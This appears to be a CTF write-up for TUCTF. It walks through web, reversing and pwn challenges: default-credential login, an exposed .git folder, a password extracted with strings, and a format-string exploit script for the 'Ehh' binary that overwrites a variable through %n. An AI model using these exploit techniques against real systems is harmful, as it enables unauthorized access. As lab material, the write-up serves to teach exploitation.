# Mrs. White's <br> Messy Maids

** Hint **

> Mrs. White's simple website might be hiding some murderous intentions...


![maids](https://github.com/SkyBulk/tuCTF/blob/master/images/maid.png)

	
the first at all , we analize the source code , and we found /Boddy. and then we added to the url

```html

<html>
        <head>
           <title>Mrs. White</title>
       <link rel="stylesheet" href="styles.css">
       </head>    
        
    <body>    
        <h1>Welcome to Mrs. White's Maid Service</h1>
        <img src="https://tinyurl.com/ybbtf3nv" height="500">
        <p>We offer only the best maids for all your cleaning needs
        <br>
        To learn more about our services, call 275-317-3581
        <!-- I might kill if I could find him. Stupid Mr. /Boddy --></p>
        </body>   
</html>

```
once the url redirect us, this lead us to the flag 

```html
<html>
        <head>
           <title>Mrs. White</title>
       <link rel="stylesheet" href="styles.css">
       </head>    
        
    <body>    
        <h1>Welcome to Mrs. White's Maid Service</h1>
        <img src="https://tinyurl.com/ybbtf3nv" height="500">
        <p>We offer only the best maids for all your cleaning needs
        <br>
        To learn more about our services, call 275-317-3581
        <!-- I might kill if I could find him. Stupid Mr. /Boddy --></p>
        </body>   
</html>
```




# Mr. Green's <br> Weird Website

** Hint **

> While investigating Mr. Green for something completely unrelated, we found this login page. Maybe you can find a way in?

the first at all , we analize the source code ,but as we didnt found nothing interesting then we try some default passwords , and we had access to the login ``` admin - admin ```


![weird](https://github.com/SkyBulk/tuCTF/blob/master/images/weird.png)


Woah woah !!! we got the flag.


# Easter Egg: <br> Copper Gate

** Hint **

> How did I end up here? - Joker

while we were look at the source , but we didn't find anything interested, but we tried to brute force the directories , and WHOA!!! we found a .git folder , and it is browsable.

![copper](https://github.com/SkyBulk/tuCTF/blob/master/images/copper.png)


we download the folder , and rebuild on our local machine.

![git](https://github.com/SkyBulk/tuCTF/blob/master/images/git.png)


once we go it , and rebuild our .git folder. we had a folder named enterthecoppergate, and we enumerate it.

```bash
~/Documents/red ops/CTF/TUCTF/web/18.191.227.167/enterthecoppergate$ ls
copperkey.jpg  gate.html  index.html  jadekey.jpg
```

oh!! interesting files we gonna try to see what has gate.html inside ....

```html
<html>
	<body bgcolor="000000">
		<center>
			<img src="../images/banner.png" alt="banner" height=150 width=700>
			</br>
			</br>
			<font color="white">
				<h1>CONGRATULATIONS!</h1>
				<h2>You have found the Copper Flag.</h2>
				</br>
				<img src="copperkey.jpg" alt="Copper" height=272 width=640>
				</br>
				<p>
					<b>VFVDVEZ7VzNsYzBtM19UMF9UaDNfMDQ1MTVfVGgzX0MwcHAzcl9LM3l9Cg==</b>
				</p>
				</br>
				<h1>The Jade Flag</h1>
				<p>The updates conceal the Jade Flag</p>
				<p>in a backup long neglected</p>
				<p>But you can only retrace your steps</p>
				<p>once the logs are all collected</p>
				</br>
				</br>
				</br>
			</font>
		</center>
	</body>
</html>

```
 we got it .. the flag 


 ```bash

 echo VFVDVEZ7VzNsYzBtM19UMF9UaDNfMDQ1MTVfVGgzX0MwcHAzcl9LM3l9Cg== | base64 -d
 TUCTF{W3lc0m3_T0_Th3_04515_Th3_C0pp3r_K3y}

 ```


 # Easter Egg: <br> Jade Gate

*** Hint **

> Gotta make sure I log my changes. - Joker

![joker](https://github.com/SkyBulk/tuCTF/blob/master/images/joker.png)



# Easter Egg: <br> Crystal Gate

** Hint **

> I don't wanna go anywhere.

![gate](https://github.com/SkyBulk/tuCTF/blob/master/images/gate.png)


# Danger Zone

** Hint **

> Legend says, this program was written by Kenny Loggins himself.

first at all we convert our pyc into .py with uncompile2 

![danger](https://github.com/SkyBulk/tuCTF/blob/master/images/danger.png)

So once we had the reversed file then we run every function top to down , and we got the flag

![danger_2](https://github.com/SkyBulk/tuCTF/blob/master/images/danger_2.png)



# yeahright

** Hint **

> What an insensitive little program.
Show it who's boss!


we ran strings to see what's going on, and oh my god !!! we have the got an interesting kind of password


```bash
strings yeahright 
/lib64/ld-linux-x86-64.so.2
libc.so.6
exit
puts
stdin
printf
read
memcmp
stdout
malloc
system
__cxa_finalize
setvbuf
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w
*Ahem*... password? 
yeahright!
/bin/cat ./flag
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
yeahright.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
pass
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
memcmp@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
setvbuf@@GLIBC_2.2.5
_Jv_RegisterClasses
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment


```
we found this interesting string ** 7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w ** so we added to the password input and whoah !!! the flag is there

```bash

./yeahright 
*Ahem*... password? 7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w

```

![yeahright](https://github.com/SkyBulk/tuCTF/blob/master/images/yeahright.png)

# Ehh

** Hint **

> Difficulty: easy Whatever... I dunno

** Test Run **

> First, let's run the program locally.

We can see that there are some hex digits printed out and some gibberish being echoed back. In order to determine what happen, let's disassemble it.

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000670 <+0>:	lea    ecx,[esp+0x4]
   0x00000674 <+4>:	and    esp,0xfffffff0
   0x00000677 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0000067a <+10>:	push   ebp
   0x0000067b <+11>:	mov    ebp,esp
   0x0000067d <+13>:	push   ebx
   0x0000067e <+14>:	push   ecx
   0x0000067f <+15>:	sub    esp,0x20
   0x00000682 <+18>:	call   0x540 <__x86.get_pc_thunk.bx>
   0x00000687 <+23>:	add    ebx,0x1979
   0x0000068d <+29>:	mov    eax,DWORD PTR [ebx-0x10]
   0x00000693 <+35>:	mov    eax,DWORD PTR [eax]
   0x00000695 <+37>:	push   0x14
   0x00000697 <+39>:	push   0x2
   0x00000699 <+41>:	push   0x0
   0x0000069b <+43>:	push   eax
   0x0000069c <+44>:	call   0x4e0 <setvbuf@plt>
   0x000006a1 <+49>:	add    esp,0x10
   0x000006a4 <+52>:	mov    eax,DWORD PTR [ebx-0x14]
   0x000006aa <+58>:	mov    eax,DWORD PTR [eax]
   0x000006ac <+60>:	push   0x14
   0x000006ae <+62>:	push   0x2
   0x000006b0 <+64>:	push   0x0
   0x000006b2 <+66>:	push   eax
   0x000006b3 <+67>:	call   0x4e0 <setvbuf@plt>
   0x000006b8 <+72>:	add    esp,0x10
   0x000006bb <+75>:	sub    esp,0x8
   0x000006be <+78>:	lea    eax,[ebx+0x28]
   0x000006c4 <+84>:	push   eax
   0x000006c5 <+85>:	lea    eax,[ebx-0x1850]
   0x000006cb <+91>:	push   eax
   0x000006cc <+92>:	call   0x4b0 <printf@plt>
   0x000006d1 <+97>:	add    esp,0x10
   0x000006d4 <+100>:	sub    esp,0x4
   0x000006d7 <+103>:	push   0x18
   0x000006d9 <+105>:	lea    eax,[ebp-0x20]
   0x000006dc <+108>:	push   eax
   0x000006dd <+109>:	push   0x0
   0x000006df <+111>:	call   0x4a0 <read@plt>
   0x000006e4 <+116>:	add    esp,0x10
   0x000006e7 <+119>:	sub    esp,0xc
   0x000006ea <+122>:	lea    eax,[ebp-0x20]
   0x000006ed <+125>:	push   eax
   0x000006ee <+126>:	call   0x4b0 <printf@plt>
   0x000006f3 <+131>:	add    esp,0x10
   0x000006f6 <+134>:	mov    eax,DWORD PTR [ebx+0x28]
   0x000006fc <+140>:	cmp    eax,0x18
   0x000006ff <+143>:	jne    0x713 <main+163>
   0x00000701 <+145>:	sub    esp,0xc
   0x00000704 <+148>:	lea    eax,[ebx-0x182e]
   0x0000070a <+154>:	push   eax
   0x0000070b <+155>:	call   0x4c0 <system@plt>
   0x00000710 <+160>:	add    esp,0x10
   0x00000713 <+163>:	mov    eax,0x0
   0x00000718 <+168>:	lea    esp,[ebp-0x8]
   0x0000071b <+171>:	pop    ecx
   0x0000071c <+172>:	pop    ebx
   0x0000071d <+173>:	pop    ebp
   0x0000071e <+174>:	lea    esp,[ecx-0x4]
   0x00000721 <+177>:	ret    
End of assembler dump.
gdb-peda$ 
```

Due to the amount of time I can spend on a challenge before failing my exams, I quickly decompile it.

![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh.png)


We can therefore see that it is most likely a format string attack since there is a printf(&buf); after reading user input.

To test it out,

![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_1.png)


Now, AAAA is stored as hex ini the 6th position. We can confirm that with %6$n.

![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_2.png)


The aim for this program to print the flag is to make sure the variable val is 24. It is currently a non 24 number. Before proceeding, we need to find out the address of val so we can write into that memory. Also, this program is not stripped meaning we can most likely find the address by typing p &val.


![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_3.png)

It is 0x56557028. Also we need to store int 24 and we will use the %n format to write it into the address.

In the payload, we add the target address followed by 24 bytes written followed by %n format. Since we are targetting the 6th position, our payload can look something like this.

```python
payload = ''
payload += struct.pack("<L",leak)
payload += '%{}x'.format(0x18-4)  # overwrite 0x5656b028 to 0x18
payload += '%6$n' # output AAAAAAAAAAAA 0xffaac0a80 x18(nil) 0xf7f3d3fc0 x565790000 x41414141 #payload AAAA%p%p%p%p%p%p%p  %p$6$n
```

For this challenge, the target address is always changing since ASLR is enabled on the server as well. However, the good news is that the target's address is printed out >Input interesting text here< 0x565ec028.

So we can write a script to get that value and setup our payload then submit it to get the flag.

** The python script **

```python 

#!/usr/bin/python

"""
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

"""
import struct
import socket
import subprocess


proc = subprocess.Popen(['./ehh'], stdout = subprocess.PIPE, stdin = subprocess.PIPE)
leak = proc.stdout.readline() # >Input interesting text here< 0x565ba028
leak = leak.split(' ')[4].strip() # 0x56615028
leak = int(leak,16) # 1448632360

payload = ''
payload += struct.pack("<L",leak)
payload += '%{}x'.format(0x18-4)  # overwrite 0x5656b028 to 0x18
payload += '%6$n' # output AAAAAAAAAAAA 0xffaac0a80 x18(nil) 0xf7f3d3fc0 x565790000 x41414141 #payload AAAA%p%p%p%p%p%p%p  %p$6$n

proc.stdin.write(payload)
print proc.stdout.readline()

```
